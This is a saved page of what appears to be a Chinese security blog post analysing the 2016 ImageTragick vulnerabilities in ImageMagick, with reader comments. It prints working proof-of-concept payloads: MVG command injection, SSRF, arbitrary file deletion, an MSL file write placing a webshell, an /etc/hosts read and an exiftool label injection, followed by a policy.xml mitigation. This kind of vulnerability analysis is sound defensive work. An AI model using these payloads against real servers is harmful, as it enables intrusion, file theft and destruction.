<span class="o">&lt;</span><span class="n">delegate</span> <span class="n">decode</span><span class="o">=</span><span class="s">"pdf"</span> <span class="n">encode</span><span class="o">=</span><span class="s">"eps"</span> <span class="n">mode</span><span class="o">=</span><span class="s">"bi"</span> <span class="n">command</span><span class="o">=</span><span class="s">"&amp;quot;gs&amp;quot; -q -dQUIET -dSAFER -dBATCH -dNOPAUSE -dNOPROMPT -dMaxBitmap=500000000 -dAlignToPixels=0 -dGridFitTT=2 &amp;quot;-sDEVICE=epswrite&amp;quot; &amp;quot;-sOutputFile=%o&amp;quot; &amp;quot;-f%i&amp;quot;"</span><span class="o">/&gt;</span>
<span class="o">&lt;</span><span class="n">delegate</span> <span class="n">decode</span><span class="o">=</span><span class="s">"pdf"</span> <span class="n">encode</span><span class="o">=</span><span class="s">"ps"</span> <span class="n">mode</span><span class="o">=</span><span class="s">"bi"</span> <span class="n">command</span><span class="o">=</span><span class="s">"&amp;quot;gs&amp;quot; -q -dQUIET -dSAFER -dBATCH -dNOPAUSE -dNOPROMPT -dMaxBitmap=500000000 -dAlignToPixels=0 -dGridFitTT=2 &amp;quot;-sDEVICE=nodevice&amp;quot; &amp;quot;-sOutputFile=%o&amp;quot; &amp;quot;-f%i&amp;quot;"</span><span class="o">/&gt;</span>
<span class="o">&lt;</span><span class="n">delegate</span> <span class="n">decode</span><span class="o">=</span><span class="s">"tiff"</span> <span class="n">encode</span><span class="o">=</span><span class="s">"launch"</span> <span class="n">mode</span><span class="o">=</span><span class="s">"encode"</span> <span class="n">command</span><span class="o">=</span><span class="s">"&amp;quot;gimp&amp;quot; &amp;quot;%i&amp;quot;"</span><span class="o">/&gt;</span>
<span class="o">&lt;</span><span class="n">delegate</span> <span class="n">decode</span><span class="o">=</span><span class="s">"pnm"</span> <span class="n">encode</span><span class="o">=</span><span class="s">"ilbm"</span> <span class="n">mode</span><span class="o">=</span><span class="s">"encode"</span> <span class="n">command</span><span class="o">=</span><span class="s">"&amp;quot;ppmtoilbm&amp;quot; -24if &amp;quot;%i&amp;quot; &amp;gt; &amp;quot;%o&amp;quot;"</span><span class="o">/&gt;</span>
<span class="o">&lt;</span><span class="n">delegate</span> <span class="n">decode</span><span class="o">=</span><span class="s">"pov"</span> <span class="n">command</span><span class="o">=</span><span class="s">"&amp;quot;povray&amp;quot; &amp;quot;+i%i&amp;quot; -D0 &amp;quot;+o%o&amp;quot; +fn%q +w%w +h%h +a -q9 &amp;quot;-kfi%s&amp;quot; &amp;quot;-kff%n&amp;quot;;&amp;quot;convert&amp;quot; -concatenate &amp;quot;%o*.png&amp;quot; &amp;quot;%o&amp;quot;"</span><span class="o">/&gt;</span>
<span class="o">&lt;</span><span class="n">delegate</span> <span class="n">decode</span><span class="o">=</span><span class="s">"ps"</span> <span class="n">encode</span><span class="o">=</span><span class="s">"eps"</span> <span class="n">mode</span><span class="o">=</span><span class="s">"bi"</span> <span class="n">command</span><span class="o">=</span><span class="s">"&amp;quot;gs&amp;quot; -q -dQUIET -dSAFER -dBATCH -dNOPAUSE -dNOPROMPT -dMaxBitmap=500000000 -dAlignToPixels=0 -dGridFitTT=2 &amp;quot;-sDEVICE=epswrite&amp;quot; &amp;quot;-sOutputFile=%o&amp;quot; &amp;quot;-f%i&amp;quot;"</span><span class="o">/&gt;</span>
<span class="o">&lt;</span><span class="n">delegate</span> <span class="n">decode</span><span class="o">=</span><span class="s">"ps"</span> <span class="n">encode</span><span class="o">=</span><span class="s">"pdf"</span> <span class="n">mode</span><span class="o">=</span><span class="s">"bi"</span> <span class="n">command</span><span class="o">=</span><span class="s">"&amp;quot;gs&amp;quot; -q -dQUIET -dSAFER -dBATCH -dNOPAUSE -dNOPROMPT -dMaxBitmap=500000000 -dAlignToPixels=0 -dGridFitTT=2 &amp;quot;-sDEVICE=pdfwrite&amp;quot; &amp;quot;-sOutputFile=%o&amp;quot; &amp;quot;-f%i&amp;quot;"</span><span class="o">/&gt;</span>
<span class="o">&lt;</span><span class="n">delegate</span> <span class="n">decode</span><span class="o">=</span><span class="s">"ps"</span> <span class="n">encode</span><span class="o">=</span><span class="s">"print"</span> <span class="n">mode</span><span class="o">=</span><span class="s">"encode"</span> <span class="n">command</span><span class="o">=</span><span class="s">"lpr &amp;quot;%i&amp;quot;"</span><span class="o">/&gt;</span>
<span class="o">&lt;</span><span class="n">delegate</span> <span class="n">decode</span><span class="o">=</span><span class="s">"ps:alpha"</span> <span class="n">stealth</span><span class="o">=</span><span class="s">"True"</span> <span class="n">command</span><span class="o">=</span><span class="s">"&amp;quot;gs&amp;quot; -q -dQUIET -dSAFER -dBATCH -dNOPAUSE -dNOPROMPT -dMaxBitmap=500000000 -dAlignToPixels=0 -dGridFitTT=2 &amp;quot;-sDEVICE=pngalpha&amp;quot; -dTextAlphaBits=%u -dGraphicsAlphaBits=%u &amp;quot;-r%s&amp;quot; %s &amp;quot;-sOutputFile=%s&amp;quot; &amp;quot;-f%s&amp;quot; &amp;quot;-f%s&amp;quot;"</span><span class="o">/&gt;</span>
<span class="o">&lt;</span><span class="n">delegate</span> <span class="n">decode</span><span class="o">=</span><span class="s">"ps:cmyk"</span> <span class="n">stealth</span><span class="o">=</span><span class="s">"True"</span> <span class="n">command</span><span class="o">=</span><span class="s">"&amp;quot;gs&amp;quot; -q -dQUIET -dSAFER -dBATCH -dNOPAUSE -dNOPROMPT -dMaxBitmap=500000000 -dAlignToPixels=0 -dGridFitTT=2 &amp;quot;-sDEVICE=pam&amp;quot; -dTextAlphaBits=%u -dGraphicsAlphaBits=%u &amp;quot;-r%s&amp;quot; %s &amp;quot;-sOutputFile=%s&amp;quot; &amp;quot;-f%s&amp;quot; &amp;quot;-f%s&amp;quot;"</span><span class="o">/&gt;</span>
<span class="o">&lt;</span><span class="n">delegate</span> <span class="n">decode</span><span class="o">=</span><span class="s">"ps:color"</span> <span class="n">stealth</span><span class="o">=</span><span class="s">"True"</span> <span class="n">command</span><span class="o">=</span><span class="s">"&amp;quot;gs&amp;quot; -q -dQUIET -dSAFER -dBATCH -dNOPAUSE -dNOPROMPT -dMaxBitmap=500000000 -dAlignToPixels=0 -dGridFitTT=2 &amp;quot;-sDEVICE=pnmraw&amp;quot; -dTextAlphaBits=%u -dGraphicsAlphaBits=%u &amp;quot;-r%s&amp;quot; %s &amp;quot;-sOutputFile=%s&amp;quot; &amp;quot;-f%s&amp;quot; &amp;quot;-f%s&amp;quot;"</span><span class="o">/&gt;</span>
<span class="o">&lt;</span><span class="n">delegate</span> <span class="n">decode</span><span class="o">=</span><span class="s">"ps:mono"</span> <span class="n">stealth</span><span class="o">=</span><span class="s">"True"</span> <span class="n">command</span><span class="o">=</span><span class="s">"&amp;quot;gs&amp;quot; -q -dQUIET -dSAFER -dBATCH -dNOPAUSE -dNOPROMPT -dMaxBitmap=500000000 -dAlignToPixels=0 -dGridFitTT=2 &amp;quot;-sDEVICE=pbmraw&amp;quot; -dTextAlphaBits=%u -dGraphicsAlphaBits=%u &amp;quot;-r%s&amp;quot; %s &amp;quot;-sOutputFile=%s&amp;quot; &amp;quot;-f%s&amp;quot; &amp;quot;-f%s&amp;quot;"</span><span class="o">/&gt;</span>
<span class="o">&lt;</span><span class="n">delegate</span> <span class="n">decode</span><span class="o">=</span><span class="s">"rgba"</span> <span class="n">encode</span><span class="o">=</span><span class="s">"rle"</span> <span class="n">mode</span><span class="o">=</span><span class="s">"encode"</span> <span class="n">command</span><span class="o">=</span><span class="s">"&amp;quot;rawtorle&amp;quot; -o &amp;quot;%o&amp;quot; -v &amp;quot;%i&amp;quot;"</span><span class="o">/&gt;</span>
<span class="o">&lt;</span><span class="n">delegate</span> <span class="n">decode</span><span class="o">=</span><span class="s">"scan"</span> <span class="n">command</span><span class="o">=</span><span class="s">"&amp;quot;scanimage&amp;quot; -d &amp;quot;%i&amp;quot; &amp;gt; &amp;quot;%o&amp;quot;"</span><span class="o">/&gt;</span>
<span class="o">&lt;</span><span class="n">delegate</span> <span class="n">decode</span><span class="o">=</span><span class="s">"scanx"</span> <span class="n">command</span><span class="o">=</span><span class="s">"&amp;quot;scanimage&amp;quot; &amp;gt; &amp;quot;%o&amp;quot;"</span><span class="o">/&gt;</span>
<span class="o">&lt;</span><span class="n">delegate</span> <span class="n">decode</span><span class="o">=</span><span class="s">"miff"</span> <span class="n">encode</span><span class="o">=</span><span class="s">"show"</span> <span class="n">spawn</span><span class="o">=</span><span class="s">"True"</span> <span class="n">command</span><span class="o">=</span><span class="s">"&amp;quot;/usr/bin/display&amp;quot; -delay 0 -window-group %[group] -title &amp;quot;%l &amp;quot; &amp;quot;ephemeral:%i&amp;quot;"</span><span class="o">/&gt;</span>
<span class="o">&lt;</span><span class="n">delegate</span> <span class="n">decode</span><span class="o">=</span><span class="s">"shtml"</span> <span class="n">command</span><span class="o">=</span><span class="s">"&amp;quot;html2ps&amp;quot; -U -o &amp;quot;%o&amp;quot; &amp;quot;%i&amp;quot;"</span><span class="o">/&gt;</span>
<span class="o">&lt;</span><span class="n">delegate</span> <span class="n">decode</span><span class="o">=</span><span class="s">"svg"</span> <span class="n">command</span><span class="o">=</span><span class="s">"&amp;quot;rsvg-convert&amp;quot; -o &amp;quot;%o&amp;quot; &amp;quot;%i&amp;quot;"</span><span class="o">/&gt;</span>
<span class="o">&lt;</span><span class="n">delegate</span> <span class="n">decode</span><span class="o">=</span><span class="s">"txt"</span> <span class="n">encode</span><span class="o">=</span><span class="s">"ps"</span> <span class="n">mode</span><span class="o">=</span><span class="s">"bi"</span> <span class="n">command</span><span class="o">=</span><span class="s">"&amp;quot;enscript&amp;quot; -o &amp;quot;%o&amp;quot; &amp;quot;%i&amp;quot;"</span><span class="o">/&gt;</span>
<span class="o">&lt;</span><span class="n">delegate</span> <span class="n">decode</span><span class="o">=</span><span class="s">"miff"</span> <span class="n">encode</span><span class="o">=</span><span class="s">"win"</span> <span class="n">stealth</span><span class="o">=</span><span class="s">"True"</span> <span class="n">spawn</span><span class="o">=</span><span class="s">"True"</span> <span class="n">command</span><span class="o">=</span><span class="s">"&amp;quot;/usr/bin/display&amp;quot; -immutable -delay 0 -window-group %[group] -title &amp;quot;%l &amp;quot; &amp;quot;ephemeral:%i&amp;quot;"</span><span class="o">/&gt;</span>
<span class="o">&lt;</span><span class="n">delegate</span> <span class="n">decode</span><span class="o">=</span><span class="s">"wmf"</span> <span class="n">command</span><span class="o">=</span><span class="s">"&amp;quot;wmf2eps&amp;quot; -o &amp;quot;%o&amp;quot; &amp;quot;%i&amp;quot;"</span><span class="o">/&gt;</span>
<span class="o">&lt;</span><span class="n">delegate</span> <span class="n">decode</span><span class="o">=</span><span class="s">"xps:color"</span> <span class="n">stealth</span><span class="o">=</span><span class="s">"True"</span> <span class="n">command</span><span class="o">=</span><span class="s">"&amp;quot;gxps&amp;quot; -dQUIET -dSAFER -dBATCH -dNOPAUSE -dNOPROMPT -dMaxBitmap=500000000 -dAlignToPixels=0 -dGridFitTT=2 &amp;quot;-sDEVICE=ppmraw&amp;quot; -dTextAlphaBits=%u -dGraphicsAlphaBits=%u &amp;quot;-r%s&amp;quot; %s &amp;quot;-sOutputFile=%s&amp;quot; &amp;quot;%s&amp;quot;"</span><span class="o">/&gt;</span>
<span class="o">&lt;</span><span class="n">delegate</span> <span class="n">decode</span><span class="o">=</span><span class="s">"xps:cmyk"</span> <span class="n">stealth</span><span class="o">=</span><span class="s">"True"</span> <span class="n">command</span><span class="o">=</span><span class="s">"&amp;quot;gxps&amp;quot; -dQUIET -dSAFER -dBATCH -dNOPAUSE -dNOPROMPT -dMaxBitmap=500000000 -dAlignToPixels=0 -dGridFitTT=2 &amp;quot;-sDEVICE=bmpsep8&amp;quot; -dTextAlphaBits=%u -dGraphicsAlphaBits=%u &amp;quot;-r%s&amp;quot; %s &amp;quot;-sOutputFile=%s&amp;quot; &amp;quot;%s&amp;quot;"</span><span class="o">/&gt;</span>
<span class="o">&lt;</span><span class="n">delegate</span> <span class="n">decode</span><span class="o">=</span><span class="s">"xps:mono"</span> <span class="n">stealth</span><span class="o">=</span><span class="s">"True"</span> <span class="n">command</span><span class="o">=</span><span class="s">"&amp;quot;gxps&amp;quot; -dQUIET -dSAFER -dBATCH -dNOPAUSE -dNOPROMPT -dMaxBitmap=500000000 -dAlignToPixels=0 -dGridFitTT=2 &amp;quot;-sDEVICE=pbmraw&amp;quot; -dTextAlphaBits=%u -dGraphicsAlphaBits=%u &amp;quot;-r%s&amp;quot; %s &amp;quot;-sOutputFile=%s&amp;quot; &amp;quot;%s&amp;quot;"</span><span class="o">/&gt;</span>
<span class="o">&lt;/</span><span class="n">delegatemap</span><span class="o">&gt;</span> 
</pre></div>
<p>我们可以看到，这里它定义了很多占位符，比如%i是输入的文件名，%l是图片exif label信息。而在后面command的位置，%i和%l等占位符被拼接在命令行中。这个漏洞也因此而来，被拼接完毕的命令行传入了系统的system函数，而我们只需使用反引号（`）或闭合双引号，来执行任意命令。</p>
<p>漏洞报告中给出的POC是利用了如下的这个委托：</p>
<div class="codehilite"><pre><span></span><span class="o">&lt;</span><span class="nt">delegate</span> <span class="nt">decode</span><span class="o">=</span><span class="s2">"https"</span> <span class="nt">command</span><span class="o">=</span><span class="s2">"&amp;quot;curl&amp;quot; -s -k -o &amp;quot;%o&amp;quot; &amp;quot;https:%M&amp;quot;"</span><span class="o">/&gt;</span>
</pre></div>
<p>它在解析https图片的时候，使用了curl命令将其下载，我们看到%M被直接放在curl的最后一个参数内。ImageMagick默认支持一种图片格式，叫mvg，而mvg与svg格式类似，其中是以文本形式写入矢量图的内容，而这其中就可以包含https处理过程。</p>
<p>所以我们可以构造一个.mvg格式的图片（但文件名可以不为.mvg，比如下图中包含payload的文件的文件名为vul.gif，而ImageMagick会根据其内容识别为mvg图片），并在https://后面闭合双引号，写入自己要执行的命令：</p>
<div class="codehilite"><pre><span></span><span class="nt">push</span> <span class="nt">graphic-context</span>
<span class="nt">viewbox</span> <span class="nt">0</span> <span class="nt">0</span> <span class="nt">640</span> <span class="nt">480</span>
<span class="nt">fill</span> <span class="s1">'url(https://"|id; ")'</span>
<span class="nt">pop</span> <span class="nt">graphic-context</span>
</pre></div>
<p>这样，ImageMagick在正常执行图片转换、处理的时候就会触发漏洞：</p>
<p>￼<a href="https://www.leavesongs.com/content/uploadfile/201605/c2cd1462642728.jpg"><img alt="14624373793837.jpg" src="./CVE-2016-3714 - ImageMagick 命令执行分析  离别歌/thum-c2cd1462642728.jpg" title="点击查看原图"/></a></p>
<p>其他几个CVE也比较有趣，比如CVE-2016-3718，他是利用mvg格式中可以包含url的特点，进行SSRF攻击，POC如下：</p>
<div class="codehilite"><pre><span></span>push graphic-context
viewbox 0 0 640 480
fill 'url(http://example.com/)'
pop graphic-context
</pre></div>
<p>CVE-2016-3715是利用ImageMagick支持的ephemeral协议，来删除任意文件：</p>
<div class="codehilite"><pre><span></span>push graphic-context
viewbox 0 0 640 480
image over 0,0 0,0 'ephemeral:/tmp/delete.txt'
popgraphic-context
</pre></div>
<p>CVE-2016-3716是利用ImageMagick支持的msl协议，来进行文件的读取和写入。利用这个漏洞，可以将任意文件写为任意文件，比如将图片写为一个.php后缀的webshell。</p>
<p>特别说明的是，msl协议是读取一个msl格式的xml文件，并根据其内容执行一些操作：</p>
<div class="codehilite"><pre><span></span>file_move.mvg
-=-=-=-=-=-=-=-=-
push graphic-context
viewbox 0 0 640 480
image over 0,0 0,0 'msl:/tmp/msl.txt'
popgraphic-context

/tmp/msl.txt
-=-=-=-=-=-=-=-=-
<span class="cp">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span>
<span class="nt">&lt;image&gt;</span>
<span class="nt">&lt;read</span> <span class="na">filename=</span><span class="s">"/tmp/image.gif"</span> <span class="nt">/&gt;</span>
<span class="nt">&lt;write</span> <span class="na">filename=</span><span class="s">"/var/www/shell.php"</span> <span class="nt">/&gt;</span>
<span class="nt">&lt;/image&gt;</span>
</pre></div>
<p>CVE-2016-3717可以造成本地文件读取漏洞：</p>
<div class="codehilite"><pre><span></span>push graphic-context
viewbox 0 0 640 480
image over 0,0 0,0 'label:@/etc/hosts'
pop graphic-context
</pre></div>
<h2 id="_2"><a class="toclink" href="#_2">深入分析</a></h2>
<p>除了报告中给出的POC以外，各个安全研究人员也集思广益，发现这个洞的更多利用/影响方式。</p>
<p>首先，PHP扩展『ImageMagick』也存在这个问题，而且只需要调用了Imagick类的构造方法，即可触发这个漏洞：</p>
<div class="codehilite"><pre><span></span><span class="cp">&lt;?php</span>
<span class="k">new</span> <span class="nx">Imagick</span><span class="p">(</span><span class="s1">'vul.gif'</span><span class="p">);</span>
</pre></div>
<p>因为没有返回值，我利用cloudeye捕捉到apache日志，从日志中读取命令执行的结果：</p>
<p><a href="https://www.leavesongs.com/content/uploadfile/201605/3c591462642729.png"><img alt="QQ20160504-5@2x.png" src="./CVE-2016-3714 - ImageMagick 命令执行分析  离别歌/thum-3c591462642729.png" title="点击查看原图"/></a>￼</p>
<p>另外，经过分析，研究人员发现除了.mvg格式的图片以外，普通png格式的图片也能触发命令执行漏洞。我们看到前面委托中对%l，也就是exif label的处理：</p>
<div class="codehilite"><pre><span></span><span class="o">&lt;</span><span class="nt">delegate</span> <span class="nt">decode</span><span class="o">=</span><span class="s2">"miff"</span> <span class="nt">encode</span><span class="o">=</span><span class="s2">"show"</span> <span class="nt">spawn</span><span class="o">=</span><span class="s2">"True"</span> <span class="nt">command</span><span class="o">=</span><span class="s2">"&amp;quot;/usr/bin/display&amp;quot; -delay 0 -window-group %</span><span class="cp">[</span><span class="k">group</span><span class="cp">]</span><span class="s2"> -title &amp;quot;%l &amp;quot; &amp;quot;ephemeral:%i&amp;quot;"</span><span class="o">/&gt;</span>
</pre></div>
<p>它将%l拼接进入了/usr/bin/display命令中，所以我只需将正常的png图片，带上一个『恶意』的exif信息。在调用ImageMagick将其处理成.show文件的时候，即可触发命令注入漏洞：</p>
<div class="codehilite"><pre><span></span>exiftool -label="\"|/usr/bin/id; \"" test.png
convert test.png o.show
</pre></div>
<p><a href="https://www.leavesongs.com/content/uploadfile/201605/7bfe1462642728.jpg"><img alt="14624399792594.jpg" src="./CVE-2016-3714 - ImageMagick 命令执行分析  离别歌/thum-7bfe1462642728.jpg" title="点击查看原图"/></a></p>
<p>但这个方法鸡肋之处在于，因为delegate.xml中配置的encode=show（或win），所以只有输出为.show或.win格式的情况下才会调用这个委托，而普通的文件处理是不会触发这个命令的。</p>
<h2 id="_3"><a class="toclink" href="#_3">影响分析</a></h2>
<p>ImageMagick是一个使用非常广的组件，大量厂商都在处理图片的时候调用这个程序进行处理，而且很多开源应用也在核心代码中包含了ImageMagick选项。</p>
<p>Wordpress是著名的个人博客/CMS厂商，其核心源码中使用了PHP扩展ImageMagick。受到这个漏洞的影响，在攻击者拥有一定权限的情况下，可以在Wordpress中触发任意命令执行漏洞： <a href="http://www.wooyun.org/bugs/wooyun-2010-0205047"><a href="http://www.wooyun.org/bugs/wooyun-2010-0205047">http://www.wooyun.org/bugs/wooyun-2010-0205047</a></a></p>
<p>同样的，Discuz、Drupal等常用CMS中也调用了ImageMagick扩展或ImageMagick库，CVE-2016-3714也可能会影响到他们。</p>
<p>但根据我对Discuz的分析，其调用ImageMagick处理图片之前，会先使用php的getimagesize进行图片格式、大小的验证，所以本文中所涉及的POC无法在Disucz中直接使用，但不排除有其他方法绕过discuz对该问题的限制。</p>
<p>除了开源软件中的漏洞以外，国内外各大厂商或多或少都收到了该问题的影响，影响最大的应该属人人，人人某处上传位置调用了ImageMagick进行图片的处理，结果造成了命令执行，导致内网被白帽子攻破： <a href="http://www.wooyun.org/bugs/wooyun-2016-0205171"><a href="http://www.wooyun.org/bugs/wooyun-2016-0205171">http://www.wooyun.org/bugs/wooyun-2016-0205171</a></a></p>
<p>另外，百度、新浪、腾讯、360等诸多厂商都收到该漏洞影响： <a href="http://www.wooyun.org/bugs/wooyun-2016-0205381"><a href="http://www.wooyun.org/bugs/wooyun-2016-0205381">http://www.wooyun.org/bugs/wooyun-2016-0205381</a></a> 、 <a href="http://www.wooyun.org/bugs/wooyun-2016-0205375"><a href="http://www.wooyun.org/bugs/wooyun-2016-0205375">http://www.wooyun.org/bugs/wooyun-2016-0205375</a></a> 、 <a href="http://www.wooyun.org/bugs/wooyun-2016-0205290"><a href="http://www.wooyun.org/bugs/wooyun-2016-0205290">http://www.wooyun.org/bugs/wooyun-2016-0205290</a></a> 、 <a href="http://www.wooyun.org/bugs/wooyun-2016-0205259"><a href="http://www.wooyun.org/bugs/wooyun-2016-0205259">http://www.wooyun.org/bugs/wooyun-2016-0205259</a></a> 、 <a href="http://www.wooyun.org/bugs/wooyun-2016-0205206"><a href="http://www.wooyun.org/bugs/wooyun-2016-0205206">http://www.wooyun.org/bugs/wooyun-2016-0205206</a></a> 、 <a href="http://www.wooyun.org/bugs/wooyun-2016-0205343"><a href="http://www.wooyun.org/bugs/wooyun-2016-0205343">http://www.wooyun.org/bugs/wooyun-2016-0205343</a></a></p>
<p>还有个比较有意思的地方，因为新浪sae的php包含ImageMagick扩展，所以乌云上有白帽子利用这个漏洞，成功绕过了sae的沙盒 <a href="http://www.wooyun.org/bugs/wooyun-2016-0205051"><a href="http://www.wooyun.org/bugs/wooyun-2016-0205051">http://www.wooyun.org/bugs/wooyun-2016-0205051</a></a></p>
<h2 id="_4"><a class="toclink" href="#_4">漏洞修复</a></h2>
<p>关于这个漏洞影响ImageMagick 6.9.3-9以前是所有版本，包括ubuntu源中安装的ImageMagick。而官方在6.9.3-9版本中对漏洞进行了不完全的修复。所以，我们不能仅通过更新ImageMagick的版本来杜绝这个漏洞。</p>
<p>现在，我们可以通过如下两个方法来暂时规避漏洞：</p>
<ol>
<li>处理图片前，先检查图片的 magic bytes，也就是图片头，如果图片头不是你想要的格式，那么就不调用ImageMagick处理图片。如果你是php用户，可以使用getimagesize函数来检查图片格式，而如果你是wordpress等web应用的使用者，可以暂时卸载ImageMagick，使用php自带的gd库来处理图片。</li>
<li>使用policy file来防御这个漏洞，这个文件默认位置在 /etc/ImageMagick/policy.xml ，我们通过配置如下的xml来禁止解析https等敏感操作：</li>
</ol>
<div class="codehilite"><pre><span></span><span class="nt">&lt;policymap&gt;</span>
<span class="nt">&lt;policy</span> <span class="na">domain=</span><span class="s">"coder"</span> <span class="na">rights=</span><span class="s">"none"</span> <span class="na">pattern=</span><span class="s">"EPHEMERAL"</span> <span class="nt">/&gt;</span>
<span class="nt">&lt;policy</span> <span class="na">domain=</span><span class="s">"coder"</span> <span class="na">rights=</span><span class="s">"none"</span> <span class="na">pattern=</span><span class="s">"URL"</span> <span class="nt">/&gt;</span>
<span class="nt">&lt;policy</span> <span class="na">domain=</span><span class="s">"coder"</span> <span class="na">rights=</span><span class="s">"none"</span> <span class="na">pattern=</span><span class="s">"HTTPS"</span> <span class="nt">/&gt;</span>
<span class="nt">&lt;policy</span> <span class="na">domain=</span><span class="s">"coder"</span> <span class="na">rights=</span><span class="s">"none"</span> <span class="na">pattern=</span><span class="s">"MVG"</span> <span class="nt">/&gt;</span>
<span class="nt">&lt;policy</span> <span class="na">domain=</span><span class="s">"coder"</span> <span class="na">rights=</span><span class="s">"none"</span> <span class="na">pattern=</span><span class="s">"MSL"</span> <span class="nt">/&gt;</span>
<span class="nt">&lt;/policymap&gt;</span> 
</pre></div>
<p>参考文献：<br>
<a href="https://imagetragick.com/"><a href="https://imagetragick.com/">https://imagetragick.com/</a></a><br>
<a href="http://www.openwall.com/lists/oss-security/2016/05/03/18"><a href="http://www.openwall.com/lists/oss-security/2016/05/03/18">http://www.openwall.com/lists/oss-security/2016/05/03/18</a></a><br/>
<a href="http://weibo.com/p/1001603971443670055277"><a href="http://weibo.com/p/1001603971443670055277">http://weibo.com/p/1001603971443670055277</a></a></br></br></p>
<p>并感谢 @redrain有节操 @Ricter @BigBan 的帮助</p>
</div>
</article>
<div id="reply-list">
<h1>评论</h1>
<div class="row" id="comment-2434">
<div class="col-xs-2 col-sm-1 gravatar">
<img alt="" src="./CVE-2016-3714 - ImageMagick 命令执行分析  离别歌/f109bc39723cc594eb2c25d4fa339240.jpgs=100&amp;d=mm&amp;r=g" width="100%"/>
</div>
<div class="col-xs-10 col-sm-11">
<p class="comment-meta title">
<a href="http://www.leavesongs.com" target="_blank">小白</a>
<time datetime="2016年9月5日 21:27" itemprop="datePublished">
                            2016 九月 05 21:27
                        </time>
<a href="javascript:reply_to('2434', '小白')">回复</a>
</p>
<p class="comment-meta">玩这些什么jsp,asp是不是都要学下</p>
</div>
</div>
<div class="row" id="comment-2330">
<div class="col-xs-2 col-sm-1 gravatar">
<img alt="" src="./CVE-2016-3714 - ImageMagick 命令执行分析  离别歌/670ff61c094067e3944447c0fce3147a.jpgs=100&amp;d=mm&amp;r=g" width="100%"/>
</div>
<div class="col-xs-10 col-sm-11">
<p class="comment-meta title">
<a href="" target="_blank">test</a>
<time datetime="2016年5月25日 10:12" itemprop="datePublished">
                            2016 五月 25 10:12
                        </time>
<a href="javascript:reply_to('2330', 'test')">回复</a>
</p>
<p class="comment-meta">getimagesize是不可靠的,<br/>http://0x1.im/blog/php/php-function-getimagesize.html</p>
</div>
</div>
<div class="child-node">
<div class="row" id="comment-2331">
<div class="col-xs-2 col-sm-1 gravatar">
<img alt="" src="./CVE-2016-3714 - ImageMagick 命令执行分析  离别歌/c4267eb6d17276fa31c547ac71611e90.jpgs=100&amp;d=mm&amp;r=g" width="100%"/>
</div>
<div class="col-xs-10 col-sm-11">
<p class="comment-meta title">
<a href="https://www.leavesongs.com/" target="_blank">phithon</a>
<time datetime="2016年5月25日 12:18" itemprop="datePublished">
                            2016 五月 25 12:18
                        </time>
<a href="javascript:reply_to('2331', 'phithon')">回复</a>
</p>
<p class="comment-meta">@test：『不是完全可靠』和『完全不可靠』可不一样哦。比如这篇文章说的图片内容，getimagesize你就绕不过，不服请给实例。</p>
</div>
</div>
<div class="child-node">
<div class="row" id="comment-2339">
<div class="col-xs-2 col-sm-1 gravatar">
<img alt="" src="./CVE-2016-3714 - ImageMagick 命令执行分析  离别歌/670ff61c094067e3944447c0fce3147a.jpgs=100&amp;d=mm&amp;r=g" width="100%"/>
</div>
<div class="col-xs-10 col-sm-11">
<p class="comment-meta title">
<a href="" target="_blank">test</a>
<time datetime="2016年5月27日 09:46" itemprop="datePublished">
                            2016 五月 27 09:46
                        </time>
<a href="javascript:reply_to('2339', 'test')">回复</a>
</p>
<p class="comment-meta">@phithon：好吧. <br/>我经历过人生第一次所谓的离别，便再也不作诗，再也不作文。<br/>这句话不错。<br/>作为我的个性签名了<br/>哈哈</p>
</div>
</div>
</div>
</div>
</div>
<form action="#reply" enctype="multipart/form-data" id="reply" method="post">
<textarea cols="40" id="id_content" name="content" required="" rows="6">
</textarea>
<div class="row">
<div class="col-xs-4">
<input id="id_nickname" maxlength="64" name="nickname" placeholder="昵称" required="" type="text"/>
</div>
<div class="col-xs-4">
<input id="id_email" maxlength="254" name="email" placeholder="邮箱（可留空）" type="text"/>
</div>
<div class="col-xs-4">
<input id="id_url" maxlength="200" name="url" placeholder="链接（可留空）" type="text"/>
</div>
</div>
<div class="row" style="margin-top: 8px"><div class="col-xs-4"><input autocomplete="off" id="id_captcha_1" name="captcha_1" placeholder="验证码" type="text"/> <input id="id_captcha_0" name="captcha_0" type="hidden" value="6d86300dcf0bbcf31e8b72f900032bbe6983e7e6"/>
</div><div class="col-xs-4">
<img alt="captcha" class="captcha" height="25" src="./CVE-2016-3714 - ImageMagick 命令执行分析  离别歌/6d86300dcf0bbcf31e8b72f900032bbe6983e7e6"/></div></div>
<div class="clearfix"></div>
<input class="ui-button ui-button-sgreen" type="submit" value="提交"/>
<input id="id_archive" name="archive" type="hidden" value="386">
<input id="id_parent" name="parent" type="hidden"/>
<input name="csrfmiddlewaretoken" type="hidden" value="UQ1QcwooA9cSF1a4rGF7fPDdWSr6QrmNsamm00AD1W6hFGyjfX9ROtFi5WUezVbX"/>
</input></form>
</div>
<footer id="footer">
<div class="footer-left">
    Copyright © 2017 Powered by talkbook
  </div>
<div class="footer-right">
<nav>
<ul>
<li><a href="/">首页</a></li>
<li><a href="http://weibo.com/101yx" target="_blank">微博</a></li>
<li><a href="https://github.com/phith0n" target="_blank">项目</a></li>
<li><a href="/template/change/">更换模板</a></li>
</ul>
</nav>
</div>
</footer>
<script src="./CVE-2016-3714 - ImageMagick 命令执行分析  离别歌/main.js"></script>
<script>
var _hmt = _hmt || [];
(function() {
  var hm = document.createElement("script");
  hm.src = "https://hm.baidu.com/hm.js?ad9ab5e37c2811b9f0979e46123fc898";
  var s = document.getElementsByTagName("script")[0]; 
  s.parentNode.insertBefore(hm, s);
})();
</script>
<script src="./CVE-2016-3714 - ImageMagick 命令执行分析  离别歌/jquery.fancybox.pack.js"></script>
<script>
$(document).ready(function () {
    $("article a").each(function (i, e) {
        if(e.host != 'www.leavesongs.com') {
            e.target = '_blank';
        }
    });
    $("article img").each(function (i, e) {
        if(e.parentNode.tagName.toUpperCase() != 'A') {
            $(e).wrap('<a href="'+escapeHtml(e.src)+'" class="fancybox"></a>');
        } else {
            $(e.parentNode).addClass('fancybox');
        }
    });
    $('.fancybox').fancybox();
})
</script>
</body>
</html>